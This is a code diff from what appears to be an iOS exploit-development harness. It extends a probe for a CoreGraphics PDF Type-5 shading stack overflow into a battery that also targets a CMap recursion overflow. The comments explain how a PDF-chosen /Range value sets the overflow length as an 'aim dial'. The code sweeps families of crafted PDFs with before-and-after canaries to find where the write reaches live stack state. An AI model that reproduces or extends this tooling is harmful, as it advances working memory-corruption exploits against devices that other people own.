@@ -6,28 +6,24 @@
 #import "Util.h"
 
 // ===========================================================================
-// CoreGraphics Type-5 (lattice-form Gouraud) shading OOB write — CVE-2026-112611
-// family, fixed only in iOS 27.2 (24B115).  Our build is 26.2b1, and the
-// 27.2 parse-time gate (range_dim == nc && nc <= 4) does not exist here at all.
+// CoreGraphics PDF OOB writes — the full CVE-2026-112611 / 112610 battery.
 //
-// At draw time _cg_shading_type5_draw builds a 72-byte mesh record per vertex
-// (colour area at +0x20, room for nc components) and calls CGFunctionEvaluate,
-// which writes R doubles — R being the /Function's /Range dimension, chosen by
-// the PDF and unrelated to nc.  The record array is a STACK VLA, so the writes
-// walk up the frame; the overflow length is exactly 8*R - 40 bytes.
+// Shading site (Type-5 lattice Gouraud): _cg_shading_type5_draw builds a
+// 72-byte mesh record per vertex (colour area at +0x20, room for nc
+// components) and calls CGFunctionEvaluate, which writes R doubles — R being
+// the /Function's /Range dimension, chosen by the PDF and unrelated to nc.  The
+// record array is a stack VLA, so with R > nc the writes walk up the frame.
+// The overflow length is exactly 8*R - 40 bytes, which makes R the aim dial.
 //
-// Our shared cache has no symbols, so the frame cannot be measured by
-// disassembly — instead the AIM IS SWEPT: R is a pure PDF parameter, and the
-// family in Resources covers 8..416 (24..3288 bytes past the record).  Each
-// render posts a canary before and after; the first R whose "before" arrives
-// without an "after" is where the write reaches live frame state.  Every
-// written double is 1.0 = 0x3FF0000000000000, so any wild dereference lands on
-// a recognisable chosen address.
+// CMap site: _cmap_convert recursion passing an unclamped codespace length L
+// into out-slots sized for one result — a stack write up the frame as well.
+//
+// Our shared cache ships without symbols, so nothing here is measured by
+// disassembly: everything is swept in the PDF and observed on device.  Each
+// render posts a canary BEFORE and AFTER, so a process that never returns
+// still leaves the exact render it died in — that render's parameters are the
+// answer.
 // ===========================================================================
-
-// Renders one bundled PDF page into a small bitmap context.  Posts a canary
-// before and after the paint, so a process that never returns still leaves the
-// exact render it died in.
 static NSString *ModRenderPDF(NSString *pdfName, NSString *tag) {
     NSString *bundle = [NSBundle mainBundle].bundlePath;
     NSString *path = [bundle stringByAppendingPathComponent:pdfName];
@@ -67,45 +63,72 @@ static NSString *ModRenderPDF(NSString *pdfName, NSString *tag) {
     return [NSString stringWithFormat:@"%@: render returned without a fault (%@)", tag, pdfName];
 }
 
-NSString *ModCGShadingOOB(void) {
-    AveLog(@"    CG Type-5 shading: CVE-2026-112611 stack OOB write, depth sweep");
-    AvePost(@"CG start");
-
-    // 1. control first: R == nc == 1 is in-bounds and must render cleanly.
-    NSString *ctl = ModRenderPDF(@"control_shading_type5.pdf", @"CG-CTL");
-    AvePost([NSString stringWithFormat:@"CGCTL %@", ctl]);
-    if (![ctl containsString:@"without a fault"]) {
-        AvePost([NSString stringWithFormat:@"CG verdict: CONTROL FAULTED (%@)", ctl]);
-        return [NSString stringWithFormat:@"CG type-5: CONTROL FAULTED (%@) - the render path "
-                @"itself is broken, not the bug", ctl];
-    }
-    AvePost(@"CGCTL in-bounds render OK, starting the R sweep");
-
-    // 2. the sweep: the bundled sht5_rNNN family in ascending order.
+// Renders a whole family of bundled PDFs in ascending name order.  Returns the
+// name of the render that never returned, or nil if every one survived.
+static NSString *ModSweepFamily(NSString *prefix, NSString *tagPrefix) {
     NSString *bundle = [NSBundle mainBundle].bundlePath;
     NSError *err = nil;
     NSArray *all = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:bundle error:&err];
     NSMutableArray *fam = [NSMutableArray array];
     for (NSString *f in all) {
-        if ([f hasPrefix:@"sht5_r"] && [f hasSuffix:@".pdf"]) [fam addObject:f];
+        if ([f hasPrefix:prefix] && [f hasSuffix:@".pdf"]) [fam addObject:f];
     }
     [fam sortUsingSelector:@selector(compare:)];
     if (!fam.count) {
-        AvePost(@"CG verdict: no sht5 family in the bundle");
-        return @"CG type-5: no R-family in the bundle";
+        AvePost([NSString stringWithFormat:@"%@ family empty", tagPrefix]);
+        return nil;
+    }
+    AvePost([NSString stringWithFormat:@"%@ family start (%lu PDFs)",
+             tagPrefix, (unsigned long)fam.count]);
+    NSString *fatal = nil;
+    for (NSString *f in fam) {
+        NSString *tag = [NSString stringWithFormat:@"%@%@",
+                         tagPrefix, [f substringFromIndex:prefix.length]];
+        tag = [tag stringByReplacingOccurrencesOfString:@".pdf" withString:@""];
+        NSString *r = ModRenderPDF(f, tag);
+        AvePost([NSString stringWithFormat:@"%@ %@", tagPrefix, r]);
+        if (![r containsString:@"without a fault"]) {
+            fatal = f;      // returned an error string (not a silent death)
+            break;
+        }
+    }
+    if (!fatal)
+        AvePost([NSString stringWithFormat:@"%@ family done: every PDF returned", tagPrefix]);
+    return fatal;
+}
+
+NSString *ModCGShadingOOB(void) {
+    AveLog(@"    CG PDF OOB battery: CVE-2026-112611 (Type-5) + 112610 (CMap)");
+    AvePost(@"CG battery start");
+
+    // ---- site 1: the Type-5 shading site ----------------------------------
+    NSString *ctl = ModRenderPDF(@"control_shading_type5.pdf", @"CG-CTL");
+    AvePost([NSString stringWithFormat:@"CGCTL %@", ctl]);
+    if (![ctl containsString:@"without a fault"]) {
+        AvePost(@"CG verdict: CONTROL FAULTED - the render path is broken, not the bug");
+        return [NSString stringWithFormat:@"CG: CONTROL FAULTED (%@)", ctl];
+    }
+    AvePost(@"CGCTL in-bounds shading renders OK");
+
+    // shallow sweep R=8..416, then the deep sweep 448..4096, then Type-4 with
+    // a chosen value.  The first render that never returns is the answer.
+    ModSweepFamily(@"sht5_r", @"CG-SH");
+    ModSweepFamily(@"deep_r", @"CG-Deep");
+    ModSweepFamily(@"t4_", @"CG-T4");
+
+    // ---- site 2: the CMap site (CVE-2026-112610) --------------------------
+    NSString *cctl = ModRenderPDF(@"control_cmap.pdf", @"CG-CMapCTL");
+    AvePost([NSString stringWithFormat:@"CGCMapCTL %@", cctl]);
+    for (NSString *f in @[@"oracle_cmap_usecmap.pdf",
+                          @"oracle_cmap_csr8.pdf",
+                          @"oracle_cmap_csr128.pdf"]) {
+        NSString *tag = [NSString stringWithFormat:@"CG-CMap%@",
+                         [f substringWithRange:NSMakeRange(12, 6)]];
+        NSString *r = ModRenderPDF(f, tag);
+        AvePost([NSString stringWithFormat:@"CGCMap %@", r]);
+        if (![r containsString:@"without a fault"]) break;
     }
 
-    NSString *last = nil;
-    for (NSString *f in fam) {
-        NSString *tag = [NSString stringWithFormat:@"CG-R%@",
-                         [f substringWithRange:NSMakeRange(6, 3)]];
-        last = ModRenderPDF(f, tag);
-        AvePost([NSString stringWithFormat:@"CGOOB %@", last]);
-        if (![last containsString:@"without a fault"])
-            return [NSString stringWithFormat:@"CG type-5: %@", last];
-    }
-    AvePost([NSString stringWithFormat:@"CG verdict: sweep done, every R returned (%lu PDFs)",
-            (unsigned long)fam.count]);
-    return [NSString stringWithFormat:@"CG type-5: sweep of %lu depths all returned without a "
-            @"fault — the write is not reaching live state", (unsigned long)fam.count];
+    AvePost(@"CG battery done: nothing faulted anywhere");
+    return @"CG battery complete: every oracle returned without a fault";
 }
